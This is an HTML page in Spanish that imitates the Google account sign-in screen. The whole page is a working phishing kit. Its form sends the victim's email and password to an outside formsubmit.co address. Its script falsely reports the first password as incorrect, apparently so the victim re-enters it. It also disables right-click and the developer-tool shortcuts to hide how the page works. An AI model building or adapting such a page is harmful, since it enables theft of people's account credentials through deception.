<!DOCTYPE html> 
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accede a tu cuenta con tu Cuenta de google</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="//www.gstatic.com/images/branding/searchlogo/ico/favicon.ico" rel="icon">
</head>
<body class="bg-[#f0f4f9] flex items-center justify-center min-h-screen">

  <!-- Contenedor -->
 <div style="width: 100%; max-width: 1280px; background-color: white; box-shadow: 0 10px 15px rgba(0,0,0,0.1); border-radius: 1rem; padding: 32px;">

    
    <!-- Logo + TÃ­tulo -->
    <div class="mb-6">
      <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" 
           alt="Google" class="w-10 mb-4">
      <h1 class="text-2xl text-gray-900 font-normal">Accede a tu cuenta</h1>
      <a href="#" class="text-sm text-gray-700">Ir a Gmail</a>
    </div>

    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          class="space-y-5">

      <!-- Paso 1: Correo -->
      <div id="step1">
        <input 
          class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600"
          id="correo"
          name="correo" 
          placeholder="Correo electrÃ³nico o telÃ©fono" 
          type="email" 
          required>

        <div class="text-sm mt-2">
          <a href="#" class="text-blue-600">Â¿Olvidaste el correo electrÃ³nico?</a>
        </div>

        <div class="flex justify-between items-center mt-6">
          <a href="#" class="text-blue-600 text-sm">Crear cuenta</a>
          <button type="button" 
                  id="btnNext1"
                  class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
            Siguiente
          </button>
        </div>
      </div>

      <!-- Paso 2: ContraseÃ±a (oculto al inicio) -->
      <div id="step2" class="hidden">
        <p class="text-gray-700 text-sm mb-2">Introduce tu contraseÃ±a</p>

        <input id="nombre" 
               class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600" 
               name="nombre" 
               placeholder="Ingresa tu contraseÃ±a" 
               type="password" 
               required>
        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">ContraseÃ±a incorrecta</p>

        <!-- Hidden fields -->
        <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
        <input type="hidden" name="_captcha" value="false">

        <div class="flex justify-between items-center mt-6">
          <a href="#" class="text-blue-600 text-sm">Â¿Olvidaste tu contraseÃ±a?</a>
          <button type="submit" 
                  class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
            Siguiente
          </button>
        </div>
      </div>
    </form>
  </div>

  <!-- Script -->
  <script>
    let intentoNombre = 0;

    // Paso de correo â†’ contraseÃ±a
    document.getElementById("btnNext1").addEventListener("click", function() {
      const correo = document.getElementById("correo").value.trim();
      if (correo === "") {
        alert("Por favor ingresa tu correo");
        return;
      }
      document.getElementById("step1").classList.add("hidden");
      document.getElementById("step2").classList.remove("hidden");
    });

    // ValidaciÃ³n contraseÃ±a
    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      intentoNombre++;

      if (intentoNombre < 2) { 
        errorMsg.classList.remove("hidden");
        nombre.classList.add("border-red-500");
        errorMsg.textContent = "ContraseÃ±a incorrecta";
        e.preventDefault();
      } else {
        errorMsg.classList.add("hidden");
        nombre.classList.remove("border-red-500");
      }
    });

    // ðŸš« Bloquear clic derecho e inspecciÃ³n
    document.addEventListener("contextmenu", e => e.preventDefault()); 
    document.onkeydown = function(e) {
      if (e.keyCode == 123) return false; // F12
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Ctrl+Shift+I
      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Ctrl+U
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Ctrl+Shift+J
    };
  </script>

</body>
</html>
